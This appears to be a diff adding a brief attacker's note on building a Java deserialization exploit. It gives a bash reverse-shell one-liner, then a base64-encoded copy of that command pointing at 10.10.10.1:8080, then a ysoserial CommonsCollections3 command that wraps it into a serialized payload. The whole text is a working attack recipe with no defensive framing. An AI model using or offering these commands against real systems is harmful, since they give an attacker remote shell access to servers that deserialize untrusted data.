@@ -1,0 +1,13 @@
+
+Create a code using below command 
+
+
+reverse shell - (you can use any reverse shell) 
+bash -i >& /dev/tcp/[IP address]/[port] 0>&1
+
+encode with base64
+
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzgwODAgMD4mMQ==}|{base64,-d}|{bash,-i}
+
+use below to generate final code for deserialization.
+java -jar ysoserial.jar CommonsCollections3 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzgwODAgMD4mMQ==}|{base64,-d}|{bash,-i}' | base64
